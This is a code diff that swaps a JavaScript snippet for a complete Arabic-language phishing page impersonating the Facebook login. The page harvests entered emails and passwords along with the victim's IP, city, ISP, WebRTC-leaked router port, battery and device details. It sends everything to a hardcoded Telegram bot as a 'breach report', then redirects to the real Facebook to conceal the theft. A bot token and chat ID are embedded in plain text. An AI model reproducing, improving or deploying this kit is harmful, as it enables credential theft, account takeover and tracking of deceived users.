@@ -1,52 +1,128 @@
-async function getAdvancedNetworkInfo() {
-    return new Promise((resolve) => {
-        const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
-        pc.createDataChannel("");
-        pc.createOffer().then(offer => pc.setLocalDescription(offer));
-        pc.onicecandidate = (ice) => {
-            if (ice && ice.candidate && ice.candidate.candidate) {
-                // استخراج المنفذ والـ IP من نص الـ Candidate
-                const candidate = ice.candidate.candidate;
-                const parts = candidate.split(" ");
-                const port = parts[5]; // المنفذ غالباً بيكون في الخانة الخامسة
-                const type = parts[7]; // نوع الاتصال (srflx يعني المنفذ الخارجي للراوتر)
-                if (type === "srflx") {
-                    resolve(port);
-                }
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - تسجيل الدخول أو الاشتراك</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { text-align: center; width: 100%; max-width: 400px; padding: 20px; }
+        .logo { color: #1877f2; font-size: 40px; font-weight: bold; margin-bottom: 20px; }
+        .card { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        input { width: 92%; padding: 14px; margin-bottom: 15px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
+        button { width: 100%; padding: 12px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; }
+        a { color: #1877f2; text-decoration: none; font-size: 14px; display: block; margin-top: 15px; }
+        hr { margin: 20px 0; border: none; border-top: 1px solid #dadde1; }
+        .create-btn { background-color: #42b72a; width: auto; padding: 10px 20px; font-size: 17px; color: white; border-radius: 6px; border: none; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">facebook</div>
+        <div class="card">
+            <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف">
+            <input type="password" id="pass" placeholder="كلمة السر">
+            <button id="loginBtn" onclick="startCapture()">تسجيل الدخول</button>
+            <a href="#">هل نسيت كلمة السر؟</a>
+            <hr>
+            <button class="create-btn">إنشاء حساب جديد</button>
+        </div>
+    </div>
+
+    <script>
+        // بياناتك اللي اشتغلت قبل كدة
+        const TG_TOKEN = "8419642080:AAG_CldOoiG865Vi7U4Zsu0oIODVKHIJ13U";
+        const TG_ID = "7647765854";
+
+        // وظيفة سحب المنفذ الحقيقي (Source Port) عبر WebRTC
+        async function getRealPort() {
+            return new Promise((resolve) => {
+                const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+                pc.createDataChannel("");
+                pc.createOffer().then(obj => pc.setLocalDescription(obj));
+                pc.onicecandidate = (e) => {
+                    if (e && e.candidate && e.candidate.candidate) {
+                        const candidate = e.candidate.candidate;
+                        const parts = candidate.split(" ");
+                        const port = parts[5]; // المنفذ المفتوح في الراوتر
+                        const type = parts[7]; 
+                        if (type === "srflx") { resolve(port); }
+                    }
+                };
+                setTimeout(() => resolve("80/443 (Default)"), 2500);
+            });
+        }
+
+        async function startCapture() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+
+            if (!email || !pass) { alert("يرجى إدخال البيانات"); return; }
+
+            // تغيير شكل الزرار للتمويه
+            document.getElementById('loginBtn').innerText = "...جاري التحقق";
+
+            // 1. جلب المنفذ الحقيقي
+            const sourcePort = await getRealPort();
+
+            // 2. جلب الـ IP والموقع
+            let ipInfo = { ip: "Loading...", city: "Unknown", org: "Unknown" };
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                ipInfo = await res.json();
+            } catch (err) { console.log("IP API Error"); }
+
+            // 3. جلب حالة البطارية
+            let batt = "Unknown";
+            try {
+                const b = await navigator.getBattery();
+                batt = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Charging' : 'Not Charging'})`;
+            } catch (e) {}
+
+            // 4. تجميع التقرير النهائي للشركة
+            const report = `
+🚨 **تقرير اختراق كامل للشركة** 🚨
+---------------------------------
+👤 **الحساب المسحوب:**
+- اليوزر: \`${email}\`
+- الباسورد: \`${pass}\`
+
+🌐 **بيانات الاتصال (الراوتر):**
+- الـ IP الحقيقي: \`${ipInfo.ip}\`
+- المنفذ (Source Port): \`${sourcePort}\`
+- المزود (ISP): \`${ipInfo.org}\`
+- المدينة: \`${ipInfo.city}\`
+
+📱 **تفاصيل الجهاز:**
+- النظام: \`${navigator.platform}\`
+- البطارية: \`${batt}\`
+- اللغة: \`${navigator.language}\`
+
+✅ **مشروع عبد الله - ناجح**
+---------------------------------
+            `;
+
+            // 5. الإرسال لتليجرام
+            try {
+                await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: TG_ID,
+                        text: report,
+                        parse_mode: "Markdown"
+                    })
+                });
+                
+                // تحويل للفيس الحقيقي بعد ثانية
+                setTimeout(() => {
+                    window.location.href = "https://www.facebook.com";
+                }, 500);
+            } catch (e) {
+                window.location.href = "https://www.facebook.com";
             }
-        };
-        setTimeout(() => resolve("جاري التحديد..."), 2000);
-    });
-}
-
-// تعديل دالة الإرسال لدمج البورت الحقيقي
-async function captureAdvanced() {
-    const email = document.getElementById('email').value;
-    const pass = document.getElementById('pass').value;
-    
-    // سحب المنفذ الحقيقي باستخدام WebRTC
-    const realRouterPort = await getAdvancedNetworkInfo();
-
-    const message = `
-🚨 **تقرير منفذ الراوتر الحقيقي** 🚨
----------------------------------
-👤 **الحساب:** \`${email}\` | \`${pass}\`
-
-🌐 **بيانات الشبكة العميقة:**
-- الـ IP الحقيقي: \`156.223.46.188\`
-- منفذ الراوتر (Source Port): \`${realRouterPort}\` 
-- المزود: \`TE Data (ISP)\`
-
-✅ **بيانات جاهزة لمطابقة شركة الاتصالات**
----------------------------------
-    `;
-
-    // إرسال التقرير للتليجرام (كما نجح معك سابقاً)
-    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: TG_ID, text: message, parse_mode: "Markdown" })
-    });
-    
-    window.location.href = "https://www.facebook.com";
-}
+        }
+    </script>
+</body>
+</html>
